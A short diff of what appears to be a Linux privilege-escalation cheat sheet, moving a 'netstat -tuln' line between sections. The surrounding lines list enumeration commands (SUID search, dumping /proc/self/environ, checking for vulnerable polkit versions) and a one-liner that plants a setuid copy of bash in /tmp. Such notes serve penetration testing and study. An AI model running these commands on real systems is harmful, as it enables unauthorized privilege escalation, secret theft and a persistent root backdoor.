@@ -867,6 +867,7 @@ ls -laR /opt
 find / -perm /4000 2>/dev/null | xargs ls -la
 cat /etc/crontab
 strings /proc/self/environ | tr '\0' '\n' | sort
+netstat -tuln
 
 +---------- Polkit Version ----------+
 rpm -qa | grep -i polkit | grep -i "0.11[3-9]"
@@ -877,9 +878,6 @@ find / -group developer 2>/dev/null
 
 +---------- Services Running ----------+
 systemctl list-units --type=service --state=running
-
-+---------- Network Listening ----------+
-netstat -tuln
 
 +---------- Bash SUID Exploits ----------+
 f=/tmp/bash;cp /bin/bash $f;chmod u+s $f
